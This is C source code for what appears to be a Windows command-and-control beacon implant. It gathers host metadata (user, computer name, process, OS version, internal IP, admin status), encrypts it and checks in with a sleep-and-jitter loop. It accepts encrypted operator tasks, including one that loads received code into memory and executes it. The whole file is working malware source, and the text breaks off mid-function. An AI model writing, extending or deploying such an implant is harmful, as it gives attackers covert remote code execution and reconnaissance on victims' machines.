#define SECURITY_WIN32

#include <windows.h>
#include <security.h>
#include <secext.h>
#include <iphlpapi.h>
#include "agent.h"
#include "udc2.h"
#include "tcg.h"

DECLSPEC_IMPORT BOOL     WINAPI  ADVAPI32$AllocateAndInitializeSid   ( PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID *);
DECLSPEC_IMPORT BOOL     WINAPI  ADVAPI32$CheckTokenMembership       ( HANDLE, PSID, PBOOL );
DECLSPEC_IMPORT PVOID    WINAPI  ADVAPI32$FreeSid                    ( PSID );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptGenRandom              ( BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptOpenAlgorithmProvider  ( BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptImportKeyPair          ( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptGenerateSymmetricKey   ( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptSetProperty             ( BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptEncrypt                ( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDecrypt                ( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptCloseAlgorithmProvider ( BCRYPT_ALG_HANDLE, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDestroyKey             ( BCRYPT_KEY_HANDLE );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptCreateHash             ( BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptHashData               ( BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptFinishHash             ( BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG );
DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDestroyHash            ( BCRYPT_HASH_HANDLE );
DECLSPEC_IMPORT BOOL     WINAPI  CRYPT32$CryptDecodeObjectEx         ( DWORD, LPCSTR, const BYTE *, DWORD, DWORD, PCRYPT_DECODE_PARA, void *, DWORD * );
DECLSPEC_IMPORT BOOL     WINAPI  CRYPT32$CryptImportPublicKeyInfoEx2 ( DWORD, PCERT_PUBLIC_KEY_INFO, DWORD, void *, BCRYPT_KEY_HANDLE * );
DECLSPEC_IMPORT HLOCAL   WINAPI  KERNEL32$LocalFree                  ( HLOCAL );
DECLSPEC_IMPORT void     WINAPI  KERNEL32$ExitProcess                ( UINT );
DECLSPEC_IMPORT void     WINAPI  KERNEL32$ExitThread                 ( DWORD );
DECLSPEC_IMPORT void     WINAPI  KERNEL32$Sleep                      ( DWORD );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$GetComputerNameExA         ( COMPUTER_NAME_FORMAT, LPSTR, LPDWORD );
DECLSPEC_IMPORT DWORD    WINAPI  KERNEL32$GetModuleFileNameA         ( HMODULE, LPSTR, DWORD );
DECLSPEC_IMPORT DWORD    WINAPI  KERNEL32$GetCurrentProcessId        ( );
DECLSPEC_IMPORT HANDLE   WINAPI  KERNEL32$GetProcessHeap             ( );
DECLSPEC_IMPORT LPVOID   WINAPI  KERNEL32$HeapAlloc                  ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$HeapFree                   ( HANDLE, DWORD, LPVOID );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$GetVersionExA              ( LPOSVERSIONINFOA );
DECLSPEC_IMPORT UINT     WINAPI  KERNEL32$GetACP                     ( );
DECLSPEC_IMPORT LPVOID   WINAPI  KERNEL32$VirtualAlloc               ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$VirtualProtect             ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL     WINAPI  KERNEL32$VirtualFree                ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT ULONG    WINAPI  IPHLPAPI$GetAdaptersInfo            ( PIP_ADAPTER_INFO, PULONG );
DECLSPEC_IMPORT BOOLEAN  WINAPI  SECUR32$GetUserNameExA              ( EXTENDED_NAME_FORMAT, LPSTR, PULONG );
DECLSPEC_IMPORT u_short  WINAPI  WS2_32$ntohs                        ( u_short );
DECLSPEC_IMPORT u_long   WINAPI  WS2_32$ntohl                        ( u_long );
DECLSPEC_IMPORT u_long   WINAPI  WS2_32$htonl                        ( u_long );
DECLSPEC_IMPORT void *   WINAPIV MSVCRT$malloc                       ( size_t );
DECLSPEC_IMPORT void     WINAPIV MSVCRT$free                         ( void * );
DECLSPEC_IMPORT int      WINAPIV MSVCRT$vsprintf_s                   ( char *, size_t, const char *, va_list );
DECLSPEC_IMPORT int      WINAPIV MSVCRT$vsnprintf                    ( char *, size_t, const char *, va_list );
DECLSPEC_IMPORT char *   WINAPIV MSVCRT$strrchr                      ( const char *, int );
DECLSPEC_IMPORT size_t   WINAPIV MSVCRT$strlen                       ( const char * );
DECLSPEC_IMPORT int      WINAPIV MSVCRT$strcmp                       ( const char *, const char * );

#define memset(x, y, z) __stosb ( ( unsigned char * ) x, y, z );
#define memcpy(x, y, z) __movsb ( ( unsigned char * ) x, ( unsigned char * ) y, z );

config   g_config;
metadata g_metadata;
UINT     g_current_task_id = 0;
BOOL     g_running = TRUE;

void setup_config ( char * pack, int pack_len )
{
    memset ( &g_config, 0, sizeof ( config ) );

    datap parser;
    BeaconDataParse ( &parser, pack, pack_len );

    int sleep   = BeaconDataInt ( &parser );
    int jitter  = BeaconDataInt ( &parser );

    int key_len;
    char * key = BeaconDataExtract ( &parser, &key_len );

    /* crystal palace pack uses little-endian */

    g_config.sleep   = WS2_32$htonl ( sleep );
    g_config.jitter  = WS2_32$htonl ( jitter );
    g_config.key_len = WS2_32$htonl ( key_len );

    memcpy ( g_config.rsa_key, key, g_config.key_len );

    /*
    * don't need to worry about freeing the parser
    * because the data is freed with the loader
    */
}

void go ( char * loader )
{
    KERNEL32$VirtualFree ( loader, 0, MEM_RELEASE );
    generate_metadata    ( );
    udc2_init            ( );

    while ( g_running )
    {
        formatp checkin;
        format_checkin ( &checkin );

        char * in_data     = NULL;
        size_t in_data_len = 0;

        udc2_go ( checkin.original, checkin.size, &in_data, &in_data_len );

        if ( in_data && in_data_len > 0 )
        {
            process_messages ( in_data, in_data_len );
            MSVCRT$free ( in_data );
        }

        if ( ! g_running )
            break;

        /* calculate sleep time */
        
        DWORD sleep_ms = g_config.sleep * 1000;

        if ( g_config.jitter > 0 && g_config.sleep > 0 )
        {
            DWORD max_delta = sleep_ms * g_config.jitter / 100;

            if ( max_delta > 0 )
            {
                UINT rand_val  = random_uint ( );
                LONG delta     = ( LONG ) ( rand_val % ( max_delta * 2 + 1 ) ) - ( LONG ) max_delta;
                LONG result    = ( LONG ) sleep_ms + delta;
                sleep_ms       = result > 0 ? ( DWORD ) result : 0;
            }
        }

        KERNEL32$Sleep ( sleep_ms );
    }

    udc2_free   ( );
    
    /**
     * TODO
     * Add ExitThread
     */

    KERNEL32$ExitProcess ( 0 );
}

void format_checkin ( formatp * parser )
{
    size_t total_len = sizeof ( int )     /* callback type */
                     + sizeof (UINT )     /* dummy task id */
                     + sizeof ( int )     /* metadata length */
                     + g_metadata.length; /* metadata */

    BeaconFormatAlloc  ( parser, total_len );
    BeaconFormatInt    ( parser, CALLBACK_METADATA );
    BeaconFormatInt    ( parser, 0 );
    BeaconFormatInt    ( parser, g_metadata.length );
    BeaconFormatAppend ( parser, g_metadata.data, g_metadata.length );
}

void generate_metadata ( )
{
    #define MAX_LEN 256

    memset ( &g_metadata, 0, sizeof ( metadata ) );

    g_metadata.bid = random_uint ( );

    random_bytes ( ( UCHAR * ) g_metadata.aes_key, AES_KEY_LEN );

    char user_name [ MAX_LEN ];
    ULONG user_name_len = MAX_LEN;
    SECUR32$GetUserNameExA ( NameSamCompatible, user_name, &user_name_len );

    char comp_name [ MAX_LEN ];
    ULONG comp_name_len = MAX_LEN;
    KERNEL32$GetComputerNameExA ( ComputerNameDnsFullyQualified, comp_name, &comp_name_len );

    char module_path [ MAX_PATH ];
    KERNEL32$GetModuleFileNameA ( NULL, module_path, MAX_PATH );

    char * process_name = MSVCRT$strrchr ( module_path, '\\' );
    process_name = process_name ? process_name + 1 : module_path;
    int process_name_len = MSVCRT$strlen ( process_name );

    int pid = KERNEL32$GetCurrentProcessId ( );

    OSVERSIONINFO os_ver;
    memset ( &os_ver, 0, sizeof ( OSVERSIONINFO ) );
    
    os_ver.dwOSVersionInfoSize = sizeof ( OSVERSIONINFO );
    KERNEL32$GetVersionExA ( &os_ver );

    UINT code_page = KERNEL32$GetACP ( );

    unsigned char internal_ip [ 4 ];
    get_internal_ip ( internal_ip );

    char flags = 0;

    if ( ! IS_X64 ( ) )
        flags |= METADATA_FLAG_X86;

    if ( BeaconIsAdmin ( ) )
        flags |= METADATA_FLAG_ADMIN;

    /* calculate total length of all metadata fields (strings are length-prefixed) */
    g_metadata.length = sizeof ( UINT )                   /* bid */
                      + AES_KEY_LEN                       /* aes key */
                      + sizeof ( int ) + user_name_len    /* len + username */
                      + sizeof ( int ) + comp_name_len    /* len + computer name */
                      + sizeof ( int ) + process_name_len /* len + process name */
                      + sizeof ( int )                    /* pid */
                      + sizeof ( DWORD )                  /* major */
                      + sizeof ( DWORD )                  /* minor */
                      + sizeof ( DWORD )                  /* build */
                      + sizeof ( UINT  )                  /* code page */
                      + 4                                 /* ipv4 */
                      + sizeof ( char );                  /* flags */

    formatp metadata;
    BeaconFormatAlloc  ( &metadata, g_metadata.length );
    BeaconFormatInt    ( &metadata, g_metadata.bid );
    BeaconFormatAppend ( &metadata, g_metadata.aes_key, AES_KEY_LEN );
    BeaconFormatInt    ( &metadata, user_name_len );
    BeaconFormatAppend ( &metadata, user_name, user_name_len );
    BeaconFormatInt    ( &metadata, comp_name_len );
    BeaconFormatAppend ( &metadata, comp_name, comp_name_len );
    BeaconFormatInt    ( &metadata, process_name_len );
    BeaconFormatAppend ( &metadata, process_name, process_name_len );
    BeaconFormatInt    ( &metadata, pid );
    BeaconFormatInt    ( &metadata, os_ver.dwMajorVersion );
    BeaconFormatInt    ( &metadata, os_ver.dwMinorVersion );
    BeaconFormatInt    ( &metadata, os_ver.dwBuildNumber );
    BeaconFormatInt    ( &metadata, code_page );
    BeaconFormatAppend ( &metadata, ( char * ) internal_ip, 4 );
    BeaconFormatAppend ( &metadata, ( char * ) &flags, sizeof ( char ) );

    /* encrypt with rsa key */
    ULONG enc_len = sizeof ( g_metadata.data );
    rsa_encrypt ( ( UCHAR * ) metadata.original, ( ULONG ) g_metadata.length, ( UCHAR * ) g_metadata.data, &enc_len );
    g_metadata.length = enc_len;

    BeaconFormatFree ( &metadata );
}

UINT random_uint ( )
{
    UINT value = 0;
    BCRYPT$BCryptGenRandom ( NULL, ( PUCHAR ) &value, sizeof ( value ), BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    return value;
}

void random_bytes ( UCHAR * buffer, size_t len )
{
    BCRYPT$BCryptGenRandom ( NULL, ( PUCHAR ) buffer, ( ULONG ) len, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
}

BOOL rsa_encrypt ( UCHAR * plaintext, ULONG plaintext_len, UCHAR * ciphertext, ULONG * ciphertext_len )
{
    BCRYPT_KEY_HANDLE      key       = NULL;
    CERT_PUBLIC_KEY_INFO * pub_info  = NULL;
    NTSTATUS               status;
    BOOL                   result    = FALSE;

    /* decode SubjectPublicKeyInfo DER -> CERT_PUBLIC_KEY_INFO (heap-allocated) */
    DWORD pub_info_len = 0;
    if ( ! CRYPT32$CryptDecodeObjectEx ( X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, ( const BYTE * ) g_config.rsa_key, g_config.key_len, CRYPT_DECODE_ALLOC_FLAG, NULL, &pub_info, &pub_info_len ) )
        goto cleanup;

    /* import into CNG as a BCRYPT_KEY_HANDLE */
    if ( ! CRYPT32$CryptImportPublicKeyInfoEx2 ( X509_ASN_ENCODING, pub_info, 0, NULL, &key ) )
        goto cleanup;

    BCRYPT_OAEP_PADDING_INFO padding;
    padding.pszAlgId = BCRYPT_SHA1_ALGORITHM;
    padding.pbLabel  = NULL;
    padding.cbLabel  = 0;

    /* query output size */
    status = BCRYPT$BCryptEncrypt ( key, plaintext, plaintext_len, &padding, NULL, 0, NULL, 0, ciphertext_len, BCRYPT_PAD_PKCS1 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptEncrypt ( key, plaintext, plaintext_len, &padding, NULL, 0, ciphertext, *ciphertext_len, ciphertext_len, BCRYPT_PAD_PKCS1 );
    if ( NT_SUCCESS ( status ) )
        result = TRUE;

cleanup:
    if ( key      ) BCRYPT$BCryptDestroyKey ( key );
    if ( pub_info ) KERNEL32$LocalFree      ( pub_info );

    return result;
}

BOOL aes_encrypt ( UCHAR * plaintext, ULONG plaintext_len, UCHAR * key, UCHAR * iv, UCHAR * ciphertext, ULONG * ciphertext_len )
{
    BCRYPT_ALG_HANDLE alg  = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    NTSTATUS status;
    BOOL result            = FALSE;

    /*
     * BCryptEncrypt updates the IV buffer in-place (CBC chaining).
     * Use a local copy so the caller's IV is not modified and can be
     * safely used for the HMAC and wire format after this call returns.
     */
    UCHAR iv_copy [ AES_KEY_LEN ];
    memcpy ( iv_copy, iv, AES_KEY_LEN );

    status = BCRYPT$BCryptOpenAlgorithmProvider ( &alg, BCRYPT_AES_ALGORITHM, NULL, 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptSetProperty ( alg, BCRYPT_CHAINING_MODE, ( PUCHAR ) BCRYPT_CHAIN_MODE_CBC, sizeof ( BCRYPT_CHAIN_MODE_CBC ), 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptGenerateSymmetricKey ( alg, &hkey, NULL, 0, key, AES_KEY_LEN, 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    /* query output size (includes PKCS7 padding to next block boundary) */
    status = BCRYPT$BCryptEncrypt ( hkey, plaintext, plaintext_len, NULL, iv_copy, AES_KEY_LEN, NULL, 0, ciphertext_len, BCRYPT_BLOCK_PADDING );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    memcpy ( iv_copy, iv, AES_KEY_LEN ); /* restore for the actual encrypt call */
    status = BCRYPT$BCryptEncrypt ( hkey, plaintext, plaintext_len, NULL, iv_copy, AES_KEY_LEN, ciphertext, *ciphertext_len, ciphertext_len, BCRYPT_BLOCK_PADDING );
    if ( NT_SUCCESS ( status ) )
        result = TRUE;

cleanup:
    if ( hkey ) BCRYPT$BCryptDestroyKey             ( hkey );
    if ( alg  ) BCRYPT$BCryptCloseAlgorithmProvider ( alg, 0 );

    return result;
}

BOOL aes_decrypt ( UCHAR * ciphertext, ULONG ciphertext_len, UCHAR * key, UCHAR * iv, UCHAR * plaintext, ULONG * plaintext_len )
{
    BCRYPT_ALG_HANDLE alg  = NULL;
    BCRYPT_KEY_HANDLE hkey = NULL;
    NTSTATUS status;
    BOOL result            = FALSE;

    UCHAR iv_copy [ AES_KEY_LEN ];
    memcpy ( iv_copy, iv, AES_KEY_LEN );

    status = BCRYPT$BCryptOpenAlgorithmProvider ( &alg, BCRYPT_AES_ALGORITHM, NULL, 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptSetProperty ( alg, BCRYPT_CHAINING_MODE, ( PUCHAR ) BCRYPT_CHAIN_MODE_CBC, sizeof ( BCRYPT_CHAIN_MODE_CBC ), 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptGenerateSymmetricKey ( alg, &hkey, NULL, 0, key, AES_KEY_LEN, 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptDecrypt ( hkey, ciphertext, ciphertext_len, NULL, iv_copy, AES_KEY_LEN, plaintext, *plaintext_len, plaintext_len, BCRYPT_BLOCK_PADDING );
    if ( NT_SUCCESS ( status ) )
        result = TRUE;

cleanup:
    if ( hkey ) BCRYPT$BCryptDestroyKey             ( hkey );
    if ( alg  ) BCRYPT$BCryptCloseAlgorithmProvider ( alg, 0 );

    return result;
}

BOOL compute_hmac ( UCHAR * data, ULONG data_len, UCHAR * key, ULONG key_len, UCHAR * hmac )
{
    BCRYPT_ALG_HANDLE  alg  = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    NTSTATUS           status;
    BOOL               result = FALSE;

    status = BCRYPT$BCryptOpenAlgorithmProvider ( &alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptCreateHash ( alg, &hash, NULL, 0, key, key_len, 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptHashData ( hash, data, data_len, 0 );
    if ( ! NT_SUCCESS ( status ) )
        goto cleanup;

    status = BCRYPT$BCryptFinishHash ( hash, hmac, HMAC_LEN, 0 );
    if ( NT_SUCCESS ( status ) )
        result = TRUE;

cleanup:
    if ( hash ) BCRYPT$BCryptDestroyHash            ( hash );
    if ( alg  ) BCRYPT$BCryptCloseAlgorithmProvider ( alg, 0 );

    return result;
}

void parse_ip_string ( const char * ip, UCHAR * parsed )
{
    UCHAR octets [ 4 ];
    int idx = 0;
    int val = 0;

    for ( const char * p = ip; *p && idx < 4; p++ )
    {
        if ( *p >= '0' && *p <= '9' )
        {
            val = val * 10 + ( *p - '0' );
        }
        else if ( *p == '.' )
        {
            octets [ idx++ ] = ( UCHAR ) val;
            val = 0;
        }
    }

    if ( idx < 4 )
        octets [ idx ] = ( UCHAR ) val;

    memcpy ( parsed, octets, 4 );
}

void get_internal_ip ( UCHAR * buffer )
{
    memset ( buffer, 0, 4 );

    ULONG buffer_len = 0;
    IPHLPAPI$GetAdaptersInfo ( NULL, &buffer_len );

    if ( buffer_len == 0 )
        return;

    HANDLE heap = KERNEL32$GetProcessHeap ( );
    PIP_ADAPTER_INFO adapters = ( PIP_ADAPTER_INFO ) KERNEL32$HeapAlloc ( heap, 0, buffer_len );

    if ( ! adapters )
        return;
    
    if ( IPHLPAPI$GetAdaptersInfo ( adapters, &buffer_len ) == NO_ERROR )
    {
        PIP_ADAPTER_INFO adapter = adapters;

        while ( adapter )
        {
            char * ip = adapter->IpAddressList.IpAddress.String;

            if ( MSVCRT$strcmp ( ip, "0.0.0.0" ) != 0 && MSVCRT$strcmp ( ip, "127.0.0.1" ) != 0 )
            {
                parse_ip_string ( ip, buffer );
                break;
            }

            adapter = adapters->Next;
        }
    }

    KERNEL32$HeapFree ( heap, 0, adapters );
}

void process_messages ( char * data, size_t len )
{
    datap msg_parser;
    BeaconDataParse ( &msg_parser, data, len );

    do
    {
        /* enc_data = hmac (32) | iv (16) | ciphertext */
        int enc_data_len;
        char * enc_data = BeaconDataExtract ( &msg_parser, &enc_data_len );

        if ( enc_data_len < HMAC_LEN + AES_KEY_LEN )
            continue;

        /* verify hmac and decrypt using g_metadata.aes_key */
        UCHAR * hmac       = ( UCHAR * ) enc_data;
        UCHAR * iv         = ( UCHAR * ) enc_data + HMAC_LEN;
        UCHAR * ciphertext = ( UCHAR * ) enc_data + HMAC_LEN + AES_KEY_LEN;

        /* verify hmac */
        UCHAR expected_hmac [ HMAC_LEN ];

        if ( ! compute_hmac ( iv, enc_data_len - HMAC_LEN, ( UCHAR * ) g_metadata.aes_key, AES_KEY_LEN, expected_hmac ) ) {
            continue;
        }
        
        BOOL hmac_ok = TRUE;

        for ( int i = 0; i < HMAC_LEN; i++ )
        {
            if ( hmac [ i ] != expected_hmac [ i ] )
            {
                hmac_ok = FALSE;
                break;
            }
        }

        if ( ! hmac_ok )
            continue;

        /* decrypt task data */
        ULONG plaintext_len = enc_data_len;
        UCHAR * plaintext   = MSVCRT$malloc ( plaintext_len );

        if ( ! plaintext )
            continue;

        if ( ! aes_decrypt ( ciphertext, enc_data_len - HMAC_LEN - AES_KEY_LEN, ( UCHAR * ) g_metadata.aes_key, iv, plaintext, &plaintext_len ) )
        {
            MSVCRT$free ( plaintext );
            continue;
        }

        /* parse the task data */
        datap task_parser;
        BeaconDataParse ( &task_parser, ( char * ) plaintext, plaintext_len );

        g_current_task_id = ( UINT ) BeaconDataInt ( &task_parser );
        int task_type     = BeaconDataInt ( &task_parser );

        int task_data_len;
        char * task_data = BeaconDataExtract ( &task_parser, &task_data_len );

        switch ( task_type )
        {
        case TASK_EXIT:
            exit_beacon ( );
            break;

        case TASK_SLEEP:
            set_sleep ( task_data, task_data_len );
            break;

        case TASK_PICO:
            execute_pico ( task_data, task_data_len );
            break;
        
        default:
            break;
        }

        MSVCRT$free ( plaintext );

    } while ( BeaconDataLength ( &msg_parser ) > 0 );
}

void execute_pico ( char * data, int len )
{
    int    pico_len;
    char * pico_src;
    char * pico_code;
    char * pico_data;
    int    args_len;
    char * args;
    bfuncs funcs;
    DWORD  old_protect;

    datap parser;
    BeaconDataParse ( &parser, data, len );
    
    pico_src = BeaconDataExtract ( &parser, &pico_len );
    args     = BeaconDataExtract ( &parser, &args_len );

    pico_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( pico_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );
    pico_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( pico_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );

    funcs.LoadLibraryA         = LoadLibraryA;
    funcs.GetProcAddress       = GetProcAddress;
    funcs.BeaconDataParse      = BeaconDataParse;
    funcs.BeaconDataExtract    = BeaconDataExtract;
    funcs.BeaconDataPtr        = BeaconDataPtr;
    funcs.BeaconDataShort      = BeaconDataShort;
    funcs.BeaconDataInt        = BeaconDataInt;
    funcs.BeaconDataLength     = BeaconDataLength;
    funcs.BeaconFormatAlloc    = BeaconFormatAlloc;
    funcs.BeaconFormatInt      = BeaconFormatInt;
    funcs.BeaconFormatPrintf   = BeaconFormatPrintf;
    funcs.BeaconFormatToString = BeaconFormatToString;
    funcs.BeaconFormatReset    = BeaconFormatReset;
    funcs.BeaconFormatFree     = BeaconFormatFree;
    funcs.BeaconPrintf         = BeaconPrintf;
    funcs.BeaconOutput         = BeaconOutput;

    PicoLoad ( ( IMPORTFUNCS * ) &funcs, pico_src, pico_code, pico_data );
    KERNEL32$VirtualProtect ( pico_code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    ( ( PICO_GO ) ( PicoEntryPoint ( pico_src, pico_code ) ) ) ( args, args_len );

    KERNEL32$VirtualFree ( pico_code, 0, MEM_RELEASE );
    KERNEL32$VirtualFree ( pico_data, 0, MEM_RELEASE );
}

void set_sleep ( char * data, int len )
{
    datap parser;
    BeaconDataParse ( &parser, data, len );

    int sleep  = BeaconDataInt ( &parser );
    int jitter = BeaconDataInt ( &parser );

    if ( jitter > 100 )
        jitter = 100;
    
    g_config.sleep  = sleep;
    g_config.jitter = jitter;

    BeaconOutput ( CALLBACK_OUTPUT, "", 0 );
}

void exit_beacon ( )
{
    g_running = FALSE;
    BeaconOutput ( CALLBACK_OUTPUT, "", 0 );
}

/**
 * Data Parser APIs
 */

void BeaconDataParse ( datap * parser, char * buffer, int size )
{
    parser->buffer   = buffer;
    parser->original = buffer;
    parser->length   = size;
    parser->size     = size;
}

char * BeaconDataExtract ( datap * parser, int * size )
{
    int sz = BeaconDataInt ( parser );
    char * buffer = parser->buffer;

    parser->buffer += sz;
    parser->length -= sz;

    if ( size )
        * size = sz;

    return buffer;
}

char * BeaconDataPtr ( datap * parser, int size )
{
    if ( parser->length < size )
        return NULL;
    
    char * data = parser->buffer;

    parser->buffer += size;
    parser->length -= size;

    return data;
}

short BeaconDataShort ( datap * parser )
{
    short value = * ( short * ) parser->buffer;

    parser->buffer += sizeof ( short );
    parser->length -= sizeof ( short );

    return WS2_32$ntohs ( value );
}

int BeaconDataInt ( datap * parser )
{
    int value = * ( int * ) parser->buffer;

    parser->buffer += sizeof ( int );
    parser->length -= sizeof ( int );

    return WS2_32$ntohl ( value );
}

int BeaconDataLength ( datap * parser )
{
    return parser->length;
}

/**
 * Format APIs
 */

void BeaconFormatAlloc ( formatp * parser, int maxsz )
{
    parser->original = MSVCRT$malloc ( maxsz );
    parser->buffer   = parser->original;
    parser->length   = maxsz;
    parser->size     = maxsz;
}

void BeaconFormatAppend ( formatp * parser, char * data, int len )
{
    memcpy ( parser->buffer, data, len );

    parser->buffer += len;
    parser->length -= len;
}

void BeaconFormatInt ( formatp * parser, int val )
{
    val = WS2_32$htonl ( val );
    BeaconFormatAppend ( parser, ( char * ) &val, sizeof ( int ) );
}

void BeaconFormatPrintf ( formatp * parser, char * fmt, ... )
{
    va_list args = NULL;
    va_start ( args, fmt );

    int len = MSVCRT$vsprintf_s ( parser->buffer, parser->length, fmt, args );

    parser->buffer += len;
    parser->length -= len;

    va_end ( args );
}

char * BeaconFormatToString ( formatp * parser, int * size )
{
    if ( size )
        * size = parser->size - parser->length;

    return parser->original;
}

void BeaconFormatReset ( formatp * parser )
{
    parser->buffer = parser->original;
    parser->length = parser->size;
}

void BeaconFormatFree ( formatp * parser )
{
    MSVCRT$free ( parser->original );
}

/**
 * Output API
 */

void BeaconPrintf ( int type, char * fmt, ... )
{
    va_list args;
    va_start ( args, fmt );
    int len = MSVCRT$vsnprintf ( NULL, 0, fmt, args );
    va_end ( args );

    if ( len <= 0 )
        return;

    char * buffer = MSVCRT$malloc ( len + 1 );
    
    if ( ! buffer )
        return;
    
    va_start ( args, fmt );
    MSVCRT$vsnprintf ( buffer, len + 1, fmt, args );
    va_end ( args );

    BeaconOutput ( type, buffer, len );
    MSVCRT$free  ( buffer );
}

void BeaconOutput ( int type, char * data, int data_len )
{
    /* generate random IV and encrypt the data */
    UCHAR iv [ AES_KEY_LEN ];
    random_bytes ( iv, AES_KEY_LEN );

    ULONG ct_len = ( ULONG ) data_len + AES_KEY_LEN;
    UCHAR * ct   = MSVCRT$malloc ( ct_len );

    if ( ! ct )
        return;

    if ( ! aes_encrypt ( ( UCHAR * ) data, ( ULONG ) data_len, ( UCHAR * ) g_metadata.aes_key, iv, ct, &ct_len ) )
        goto cleanup_ct;

    /* 256 hmac over IV || ciphertext */
    ULONG mac_input_len = AES_KEY_LEN + ct_len;
    UCHAR * mac_input   = MSVCRT$malloc ( mac_input_len );

    if ( ! mac_input )
        goto cleanup_ct;

    memcpy ( mac_input, iv, AES_KEY_LEN );
    memcpy ( mac_input + AES_KEY_LEN, ct, ct_len );

    UCHAR hmac [ HMAC_LEN ];

    if ( ! compute_hmac ( mac_input, mac_input_len, ( UCHAR * ) g_metadata.aes_key, AES_KEY_LEN, hmac ) )
    {
        MSVCRT$free ( mac_input );
        goto cleanup_ct;
    }

    MSVCRT$free ( mac_input );

    /* enc_data = hmac | iv | ciphertext */
    ULONG enc_data_len = HMAC_LEN + AES_KEY_LEN + ct_len;

    /* wire format: type | task_id | enc_data_len | enc_data | flag */
    size_t total_len = sizeof ( int  )   /* type         */
                     + sizeof ( UINT )   /* task_id      */
                     + sizeof ( int  )   /* enc_data_len */
                     + enc_data_len      /* enc_data     */
                     + sizeof ( int  );  /* flag         */

    formatp output;
    BeaconFormatAlloc  ( &output, total_len );
    BeaconFormatInt    ( &output, type );
    BeaconFormatInt    ( &output, g_current_task_id );
    BeaconFormatInt    ( &output, enc_data_len );
    BeaconFormatAppend ( &output, ( char * ) hmac, HMAC_LEN );
    BeaconFormatAppend ( &output, ( char * ) iv, AES_KEY_LEN );
    BeaconFormatAppend ( &output, ( char * ) ct, ct_len );
    BeaconFormatInt    ( &output, 1 ); /* temp */

    char * resp_body;
    size_t resp_size;

    udc2_go ( output.original, output.size, &resp_body, &resp_size );

    BeaconFormatFree ( &output );
    MSVCRT$free ( resp_body );

cleanup_ct:
    MSVCRT$free ( ct );
}

/**
 * Internal APIs
 */

BOOL BeaconIsAdmin ( )
{
    SID_IDENTIFIER_AUTHORITY nt_auth = SECURITY_NT_AUTHORITY;
    PSID sid;

    if ( ! ADVAPI32$AllocateAndInitializeSid ( &nt_auth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid ) )
        return FALSE;

    BOOL is_admin = FALSE;
    ADVAPI32$CheckTokenMembership ( NULL, sid, &is_admin );

